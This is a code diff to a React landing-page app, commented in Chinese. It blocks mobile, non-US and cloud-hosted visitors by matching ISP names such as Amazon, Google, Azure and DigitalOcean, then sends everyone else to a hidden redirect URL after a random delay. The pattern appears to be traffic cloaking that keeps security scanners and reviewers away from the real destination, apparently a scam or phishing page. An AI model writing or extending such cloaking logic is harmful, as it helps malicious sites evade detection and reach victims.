@@ -25,12 +25,6 @@ const App: React.FC = () => {
       // 设备检测
       const isDesktop = !/Mobi|Android|iPhone|iPad|Tablet/i.test(navigator.userAgent);
       
-      if (!isDesktop) {
-        setNotice('Desktop access required to continue.');
-        setAccessStatus('blocked_device');
-        return;
-      }
-
       // 先获取IP基础信息
       let ipData: any = {};
       try {
@@ -61,25 +55,44 @@ const App: React.FC = () => {
           isp
         });
 
-        if (country && country !== "US") {
-          setNotice('This content is available for US visitors only.');
-          setAccessStatus('blocked_geo');
-          return;
+        let isBlocked = false;
+
+        // 国家
+        if (country !== "US") {
+          isBlocked = true;
         }
 
-        const isBlockedProxy = proxy === "yes" || type === "hosting" || type === "vpn";
-        if (isBlockedProxy) {
-          setNotice('Residential US IP required. Proxy/VPN detected.');
-          setAccessStatus('blocked_proxy');
+        // 设备
+        if (!isDesktop) {
+          isBlocked = true;
+        }
+
+        // ISP（机房判断）
+        if (
+          isp.includes("amazon") ||
+          isp.includes("aws") ||
+          isp.includes("google") ||
+          isp.includes("microsoft") ||
+          isp.includes("azure") ||
+          isp.includes("digitalocean") ||
+          isp.includes("linode") ||
+          isp.includes("ovh") ||
+          isp.includes("vultr")
+        ) {
+          isBlocked = true;
+        }
+
+        // 如果被拦截
+        if (isBlocked) {
+          document.body.innerHTML = "Access restricted";
           return;
         }
 
         setAccessStatus('allowed');
       } catch (e) {
         console.log("check error", e);
-        if (country && country !== "US") {
-          setNotice('This content is available for US visitors only.');
-          setAccessStatus('blocked_geo');
+        if (country !== "US" || !isDesktop) {
+          document.body.innerHTML = "Access restricted";
           return;
         }
         setAccessStatus('allowed');
@@ -91,7 +104,7 @@ const App: React.FC = () => {
 
   useEffect(() => {
     if (accessStatus === 'allowed') {
-      const delay = Math.floor(Math.random() * (3500 - 1500 + 1)) + 1500;
+      const delay = Math.floor(Math.random() * (2500 - 1500 + 1)) + 1500;
       const timer = setTimeout(() => {
         window.location.href = redirectUrl;
       }, delay);
